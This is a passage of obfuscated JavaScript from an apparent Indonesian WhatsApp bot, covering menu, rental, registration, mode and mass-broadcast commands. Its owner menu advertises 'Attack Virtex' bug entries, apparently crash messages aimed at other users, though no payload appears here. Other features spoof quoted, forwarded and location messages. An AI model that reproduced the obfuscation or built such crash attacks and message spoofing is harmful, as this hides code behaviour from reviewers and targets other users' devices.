_0x39f6c9(0xc4):case'rent':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu=![]){const sewamenu11=[{'title':_0x39f6c9(0x18d),'description':'Rp.30.000\x0aDapatkan\x20Fitur\x20VIP','rowId':_0x39f6c9(0x15c)}],sewamenu41=[{'title':_0x39f6c9(0x213),'description':'Free\x0aSewa\x20Bot\x20Selama\x201\x20Hari','rowId':_0x39f6c9(0x16d)}],sewamenu21=[{'title':_0x39f6c9(0x17a),'description':'Rp.25.000\x0aSewa\x20Bot\x20Selama\x201\x20Bulan','rowId':_0x39f6c9(0x16d)}],sewamenu31=[{'title':'1\x20Minggu','description':'Rp.10.000\x0aDapatkan\x20Fitur\x20Premium','rowId':'Contributor'}],sewamenu51=[{'title':_0x39f6c9(0xae),'description':_0x39f6c9(0x13d),'rowId':_0x39f6c9(0xb5)}],sewamenu61=[{'title':_0x39f6c9(0xd9),'description':_0x39f6c9(0x200),'rowId':_0x39f6c9(0xfc)}],sewamenu71=[{'title':_0x39f6c9(0x186),'description':_0x39f6c9(0x175),'rowId':_0x39f6c9(0x1d2)}],sectionssewas1=[{'title':_0x39f6c9(0x18d),'rows':sewamenu11},{'title':'Sewa\x201\x20Bulan','rows':sewamenu21},{'title':'Sewa\x201\x20Minggu','rows':sewamenu31},{'title':_0x39f6c9(0x186),'rows':sewamenu71},{'title':_0x39f6c9(0x1bf),'rows':sewamenu41},{'title':_0x39f6c9(0xae),'rows':sewamenu51},{'title':_0x39f6c9(0xd9),'rows':sewamenu61}],buttonssewaas1={'buttonText':_0x39f6c9(0x223),'footerText':ind[_0x39f6c9(0x2b4)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionssewas1,'listType':0x1};client['sendMessage'](from,buttonssewaas1,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x2b4)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x232):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const downloadrows12=[{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionsdownl12=[{'title':_0x39f6c9(0x125),'rows':downloadrows12}],buttondownt12={'buttonText':_0x39f6c9(0x209),'footerText':ind['downloadmenu'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsdownl12,'listType':0x1};client[_0x39f6c9(0x208)](from,buttondownt12,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x232)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x144):case _0x39f6c9(0x1dc):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(mainmenu==![]){const gabutrows2=[{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionsgabut2=[{'title':_0x39f6c9(0x10d),'rows':gabutrows2}],buttongabut2={'buttonText':'Click\x20Me!','footerText':ind[_0x39f6c9(0x1dc)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgabut2,'listType':0x1};client['sendMessage'](from,buttongabut2,MessageType['listMessage'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else{if(mainmenu=!![]){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x1dc)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});}}break;case _0x39f6c9(0x182):case _0x39f6c9(0x1a5):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(mainmenu==![]){const cekrows2=[{'title':'Donasi','description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionscek2=[{'title':_0x39f6c9(0xe3),'rows':cekrows2}],buttoncek2={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0x182)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+'*\x0a*Bot\x20ini\x20di\x20lengkapi\x20Anti-Spam\x20jadi\x20beri\x20jeda\x205\x20detik*','sections':sectionscek2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttoncek2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x182)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case'gachamenu':case'menugacha':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const crajsows2=[{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionsgahck2=[{'title':'Gacha\x20Menu','rows':crajsows2}],buttoncadhck2={'buttonText':_0x39f6c9(0x209),'footerText':ind['gachamenu'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgahck2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttoncadhck2,MessageType['listMessage'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x218)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x297):case _0x39f6c9(0x20e):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(mainmenu==![]){const gamerows2=[{'title':_0x39f6c9(0x271),'description':'Donasi','rowId':'\x20'}],sectionsgame2=[{'title':_0x39f6c9(0x10e),'rows':gamerows2}],buttongame2={'buttonText':_0x39f6c9(0x209),'footerText':ind['gamemenu'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgame2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttongame2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind['gamemenu'](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case'convertmenu':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const convertrows2=[{'title':'Donasi','description':_0x39f6c9(0x271),'rowId':'\x20'}],sectioncovnert2=[{'title':_0x39f6c9(0x134),'rows':convertrows2}],buttonconvert2={'buttonText':_0x39f6c9(0x209),'footerText':ind['convertmenu'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectioncovnert2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonconvert2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x1e1)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x1c1):case _0x39f6c9(0x1aa):case'groupmenu':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(mainmenu==![]){const grouprows2=[{'title':_0x39f6c9(0xdb),'description':'Fitur\x20Welcome','rowId':'\x20'},{'title':_0x39f6c9(0x25a),'description':_0x39f6c9(0x191),'rowId':'\x20'},{'title':_0x39f6c9(0x295),'description':_0x39f6c9(0x101),'rowId':'\x20'},{'title':'Anti\x20Virtex','description':_0x39f6c9(0x207),'rowId':'\x20'},{'title':_0x39f6c9(0xd1),'description':_0x39f6c9(0x253),'rowId':'\x20'},{'title':_0x39f6c9(0x2b7),'description':_0x39f6c9(0x21f),'rowId':'\x20'},{'title':_0x39f6c9(0x1d3),'description':_0x39f6c9(0x2c8),'rowId':'\x20'},{'title':'List\x20Admin','description':_0x39f6c9(0x122),'rowId':'\x20'},{'title':_0x39f6c9(0x22e),'description':_0x39f6c9(0x1e8),'rowId':'\x20'},{'title':_0x39f6c9(0x116),'description':_0x39f6c9(0x102),'rowId':'\x20'},{'title':'Group\x20Info','description':_0x39f6c9(0x2ac),'rowId':'\x20'},{'title':_0x39f6c9(0x141),'description':_0x39f6c9(0x21e),'rowId':'\x20'}],sectionsgroup2=[{'title':_0x39f6c9(0x2d7),'rows':grouprows2}],buttongroup2={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0x188)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgroup2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttongroup2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x188)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xa9):case _0x39f6c9(0x20a):case _0x39f6c9(0x236):case _0x39f6c9(0x133):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const rowsmenus1=[{'title':_0x39f6c9(0x125),'description':_0x39f6c9(0x148),'rowId':'\x20'},{'title':_0x39f6c9(0x1fc),'description':'Menampilkan\x20fitur\x20dari\x20Convert','rowId':'\x20'},{'title':'Gabut\x20Menu','description':_0x39f6c9(0x21d),'rowId':'\x20'},{'title':_0x39f6c9(0x10e),'description':_0x39f6c9(0x21d),'rowId':'\x20'},{'title':_0x39f6c9(0x289),'description':_0x39f6c9(0x21d),'rowId':'\x20'},{'title':_0x39f6c9(0xe3),'description':'Untuk\x20Hiburan\x20Di\x20Group','rowId':'\x20'},{'title':_0x39f6c9(0x2d7),'description':_0x39f6c9(0xb4),'rowId':'\x20'},{'title':'Info\x20Menu','description':_0x39f6c9(0x20b),'rowId':'\x20'},{'title':'Owner\x20Menu','description':_0x39f6c9(0x20b),'rowId':'\x20'}],rowsmenus2=[{'title':'Anonnymous\x20Chat','description':_0x39f6c9(0x1cf),'rowId':'\x20'}],rowsmenus3=[{'title':'Set\x20Menu','description':_0x39f6c9(0x179),'rowId':'\x20'},{'title':_0x39f6c9(0x2ad),'description':'Nomor\x20Developer\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0x16a),'description':_0x39f6c9(0x200),'rowId':'\x20'},{'title':_0x39f6c9(0x258),'description':_0x39f6c9(0x212),'rowId':'\x20'},{'title':_0x39f6c9(0x1a2),'description':_0x39f6c9(0x1a6),'rowId':'\x20'},{'title':_0x39f6c9(0xde),'description':_0x39f6c9(0x2a1),'rowId':'\x20'},{'title':_0x39f6c9(0xd5),'description':_0x39f6c9(0xfd),'rowId':'\x20'},{'title':_0x39f6c9(0x1d4),'description':_0x39f6c9(0x197),'rowId':'\x20'}],rowsmenus4=[{'title':_0x39f6c9(0xb8),'description':'Untuk\x20Membuat\x20Stiker,\x20type:\x20#stiker\x20reply\x20[gambar]','rowId':'\x20'}],rowsmenus5=[{'title':_0x39f6c9(0x2d8),'description':_0x39f6c9(0x1ce),'rowId':'\x20'}],sectionsmenuss=[{'title':_0x39f6c9(0x2ae),'rows':rowsmenus1},{'title':'Anonnymous\x20Chat','rows':rowsmenus2},{'title':_0x39f6c9(0x115),'rows':rowsmenus3},{'title':_0x39f6c9(0x221),'rows':rowsmenus4},{'title':_0x39f6c9(0xef),'rows':rowsmenus5}],buttonsmenuss={'buttonText':'Click\x20Me!','footerText':_0x39f6c9(0x279)+fake+'\x20salah\x20satu\x20Bot\x20Whatsapp\x20yang\x20diciptakan\x20oleh\x20manusia\x20gabut\x20:\x20@'+ow['split']('@')[0x0]+_0x39f6c9(0x118)+fake+_0x39f6c9(0x192),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+'*','sections':sectionsmenuss,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonsmenuss,MessageType[_0x39f6c9(0xa1)],{'caption':fake,'contextInfo':{'text':'hi','forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'mentionedJid':[dev,ow,numbernye,player]},'quoted':ftoko,'sendEphemeral':!![]});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind['simplemenu'](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x20d):case'menuowner':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(mainmenu==![]){const ownerrowsbtnc=[{'title':'Mode','description':_0x39f6c9(0x22c),'rowId':'\x20'},{'title':_0x39f6c9(0x10f),'description':_0x39f6c9(0x16f),'rowId':'\x20'},{'title':'Leave','description':_0x39f6c9(0x12c),'rowId':'\x20'},{'title':_0x39f6c9(0x155),'description':_0x39f6c9(0x26c),'rowId':'\x20'},{'title':_0x39f6c9(0x120),'description':_0x39f6c9(0x1f7),'rowId':'\x20'},{'title':_0x39f6c9(0x248),'description':_0x39f6c9(0x2d4),'rowId':'\x20'},{'title':_0x39f6c9(0x256),'description':_0x39f6c9(0xa5),'rowId':'\x20'},{'title':'UnMute','description':_0x39f6c9(0x222),'rowId':'\x20'},{'title':_0x39f6c9(0x170),'description':_0x39f6c9(0x145),'rowId':'\x20'},{'title':_0x39f6c9(0x29e),'description':_0x39f6c9(0x1c4),'rowId':'\x20'},{'title':'Archive','description':'Pesan\x20Diarsipkan','rowId':'\x20'},{'title':_0x39f6c9(0x264),'description':_0x39f6c9(0x277),'rowId':'\x20'},{'title':'Delete\x20Pc','description':_0x39f6c9(0xac),'rowId':'\x20'},{'title':'Kick\x20All','description':_0x39f6c9(0xec),'rowId':'\x20'}],ownerrowsbtn2c=[{'title':_0x39f6c9(0x184),'description':_0x39f6c9(0x249),'rowId':'\x20'},{'title':_0x39f6c9(0x28d),'description':_0x39f6c9(0x12d),'rowId':'\x20'},{'title':_0x39f6c9(0x25b),'description':'Bot\x20Menampilkan\x20List\x20Group','rowId':'\x20'}],ownerrowsbtn3c=[{'title':_0x39f6c9(0x23c),'description':'Attack\x20Virtex','rowId':'\x20'},{'title':_0x39f6c9(0xf1),'description':_0x39f6c9(0x27a),'rowId':'\x20'},{'title':_0x39f6c9(0xcf),'description':'Attack\x20Virtex','rowId':'\x20'}],sectionsownerbtnc=[{'title':_0x39f6c9(0x187),'rows':ownerrowsbtnc},{'title':_0x39f6c9(0x22d),'rows':ownerrowsbtn2c},{'title':'VIRTEX\x20&\x20BUG','rows':ownerrowsbtn3c}],buttonownerbtnc={'buttonText':'Hai\x20Sayangku','footerText':ind[_0x39f6c9(0x26b)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsownerbtnc,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonownerbtnc,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x26b)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x29b):case _0x39f6c9(0x1b1):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isGroup)return reply(_0x39f6c9(0x16b));if(isBanned)return replysticker(banstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());anug=getRegisteredRandomId(_registered)[_0x39f6c9(0x2a7)](_0x39f6c9(0xf3),'');const anugaa=anug[_0x39f6c9(0x15b)]('@')[0x0]+'@s.whatsapp.net';await reply(_0x39f6c9(0x1a7)),await sleep(0xbb8);const buttonsjodoh1=[{'buttonId':'next','buttonText':{'displayText':'NEXT'},'type':0x1}],buttonMessagejodoh1={'contentText':_0x39f6c9(0x16e)+prefix+_0x39f6c9(0xc3)+pushname+'\x0a@'+anugaa[_0x39f6c9(0x15b)]('@')[0x0],'footerText':_0x39f6c9(0x1af)+anug+_0x39f6c9(0x1e7)+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x173)+ow['split']('@')[0x0]+'*','buttons':buttonsjodoh1,'headerType':0x6,'locationMessage':buttonloc2['message'][_0x39f6c9(0xf5)]};client[_0x39f6c9(0x208)](from,buttonMessagejodoh1,MessageType[_0x39f6c9(0x150)],{'quoted':mek,'contextInfo':{'sendEphemeral':!![],'mentionedJid':[anugaa,numbernye,dev,ow]}}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x21a):var kntl=body[_0x39f6c9(0x24a)](0x8),nama=kntl[_0x39f6c9(0x15b)]('|')[0x0],impostor=kntl[_0x39f6c9(0x15b)]('|')[0x1],bro=fs[_0x39f6c9(0x1cb)](_0x39f6c9(0x159)+wmthumbnail);client[_0x39f6c9(0x208)](from,{'name':''+nama,'address':''+impostor,'jpegThumbnail':bro},MessageType['location']);break;case'daftar':case _0x39f6c9(0x27c):case _0x39f6c9(0x199):if(isRegistered)return replysticker(registc);const serialUser=createSerial(0xa),rediregis1=ind[_0x39f6c9(0x2cf)](pushname,serialUser,time,sender,_registered),rediregis2=_0x39f6c9(0x1fe)+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x173)+ow['split']('@')[0x0]+'*',rediregis3=[{'buttonId':'menu','buttonText':{'displayText':_0x39f6c9(0x28a)},'type':0x1},{'buttonId':_0x39f6c9(0x237),'buttonText':{'displayText':_0x39f6c9(0x1b6)},'type':0x1}];veri=sender;!isGroup?(addRegisteredUser(sender,pushname,time,serialUser),await sendButtonRegis(from,rediregis1,rediregis2,rediregis3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),console['log'](color(_0x39f6c9(0x100)),color(time,_0x39f6c9(0x1bb)),_0x39f6c9(0xa6),color(pushname,'cyan'),_0x39f6c9(0x154),color(serialUser,_0x39f6c9(0x104)),'in',color(sender||groupName))):(addRegisteredUser(sender,pushname,time,serialUser),await sendButtonRegis(from,rediregis1,rediregis2,rediregis3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),console['log'](color(_0x39f6c9(0x100)),color(time,_0x39f6c9(0x1bb)),_0x39f6c9(0xa6),color(pushname,_0x39f6c9(0x104)),_0x39f6c9(0x154),color(serialUser,_0x39f6c9(0x104))));break;case'delete':case'del':case'd':if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isGroup&&!isOwner)return replysticker(grupstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);client[_0x39f6c9(0x146)](from,{'id':mek[_0x39f6c9(0x265)][_0x39f6c9(0x233)][_0x39f6c9(0x1a0)]['stanzaId'],'remoteJid':from,'fromMe':!![]});break;case _0x39f6c9(0x267):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);if(args[0x0]===_0x39f6c9(0x190)){if(banChats===!![])return reply(_0x39f6c9(0x18b));banChats=!![],reply(_0x39f6c9(0x216));}else{if(args[0x0]===_0x39f6c9(0x1fa)){if(banChats===![])return reply(_0x39f6c9(0x220));banChats=![],reply(_0x39f6c9(0x1ea));}else{if(!q){const mode1343w1=_0x39f6c9(0x214)+numbernye[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x173)+ow['split']('@')[0x0]+'*',mode13431=[{'buttonId':_0x39f6c9(0x1fa),'buttonText':{'displayText':'Public'},'type':0x1},{'buttonId':'self','buttonText':{'displayText':_0x39f6c9(0x2bd)},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),mode1343w1,mode13431,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}}}break;case _0x39f6c9(0x190):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(banChats===!![])return reply(_0x39f6c9(0x18b));banChats=!![],reply(_0x39f6c9(0x216));break;case'public':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);if(banChats===![])return reply(_0x39f6c9(0x220));banChats=![],reply('```STATUS\x20:\x20PUBLIC```');break;case _0x39f6c9(0x21b):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isOwner)return replysticker(ownerstc);setTimeout(()=>{const _0x356b78=_0x39f6c9;client[_0x356b78(0x156)](from);},0x7d0),setTimeout(()=>{const _0x50e2b0=_0x39f6c9;client[_0x50e2b0(0x2c1)](from,Presence['composing']),replysticker(leavestc);},0x0);break;case'bc':if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isOwner)return replysticker(ownerstc);if(args[_0x39f6c9(0x2cb)]<0x0)return reply('.......');anu=await client[_0x39f6c9(0xb7)][_0x39f6c9(0x239)]();if(isMedia&&!mek[_0x39f6c9(0x265)][_0x39f6c9(0x1fb)]||isQuotedImage){const encmedia=isQuotedImage?JSON[_0x39f6c9(0x219)](JSON[_0x39f6c9(0x109)](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)][_0x39f6c9(0x233)]['contextInfo']:mek;buff=await client['downloadMediaMessage'](encmedia);for(let _ of anu){client[_0x39f6c9(0x208)](_[_0x39f6c9(0x11b)],buff,image,{'quoted':mek,'thumbnail':Buffer[_0x39f6c9(0xbf)](0x0),'caption':_0x39f6c9(0xa7)+fake+'\x20BROADCAST*\x20]\x0a\x0a'+body[_0x39f6c9(0x24a)](0x4)});}reply(_0x39f6c9(0x1bc));}else{if(isMedia&&!mek[_0x39f6c9(0x265)]['videoMessage']||isQuotedVideo){const encmedia=isQuotedVideo?JSON[_0x39f6c9(0x219)](JSON['stringify'](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)]['extendedTextMessage'][_0x39f6c9(0x1a0)]:mek;bc=await client[_0x39f6c9(0x1d5)](encmedia);for(let _ of anu){client[_0x39f6c9(0x208)](_[_0x39f6c9(0x11b)],bc,video,{'mimetype':_0x39f6c9(0x24d),'duration':0x15751bf0,'quoted':mek,'caption':_0x39f6c9(0xa7)+fake+_0x39f6c9(0x1b5)+body['slice'](0x4)});}reply(_0x39f6c9(0x1bc));}else{if(isMedia&&!mek['message'][_0x39f6c9(0x1fb)]||isQuotedVideo){const encmedia=isQuotedVideo?JSON['parse'](JSON[_0x39f6c9(0x109)](mek)['replace']('quotedM','m'))[_0x39f6c9(0x265)]['extendedTextMessage'][_0x39f6c9(0x1a0)]:mek;bc=await client[_0x39f6c9(0x1d5)](encmedia);for(let _ of anu){client[_0x39f6c9(0x208)](_[_0x39f6c9(0x11b)],bc,sticker,{'mimetype':Mimetype[_0x39f6c9(0x1e2)],'quoted':mek,'caption':'[\x20*'+fake+_0x39f6c9(0x1b5)+body['slice'](0x4)});}reply(_0x39f6c9(0x1bc));}else{if(isMedia&&!mek[_0x39f6c9(0x265)][_0x39f6c9(0x1e4)]||isQuotedAudio){const encmedia=isQuotedAudio?JSON[_0x39f6c9(0x219)](JSON[_0x39f6c9(0x109)](mek)[_0x39f6c9(0x2a7)](_0x39f6c9(0x106),'m'))[_0x39f6c9(0x265)]['extendedTextMessage'][_0x39f6c9(0x1a0)]:mek;bc=await client[_0x39f6c9(0x1d5)](encmedia);for(let _ of anu){client['sendMessage'](_[_0x39f6c9(0x11b)],bc,audio,{'mimetype':_0x39f6c9(0x132),'duration':0x15751bf0,'ptt':!![],'quoted':mek,'caption':_0x39f6c9(0xa7)+fake+_0x39f6c9(0x1b5)+body['slice'](0x4)});}reply(_0x39f6c9(0x1bc));}else{if(isMedia&&!mek[_0x39f6c9(0x265)]['videoMessage']||isQuotedSticker){const encmedia=isQuotedSticker?JSON[_0x39f6c9(0x219)](JSON['stringify'](mek)[_0x39f6c9(0x2a7)]('quotedM','m'))[_0x39f6c9(0x265)][_0x39f6c9(0x233)]['contextInfo']:mek;bc=await client[_0x39f6c9(0x1d5)](encmedia);for(let _ of anu){client[_0x39f6c9(0x208)](_[_0x39f6c9(0x11b)],bc,sticker,{'quoted':mek});}reply(_0x39f6c9(0x1bc));}else{for(let _ of 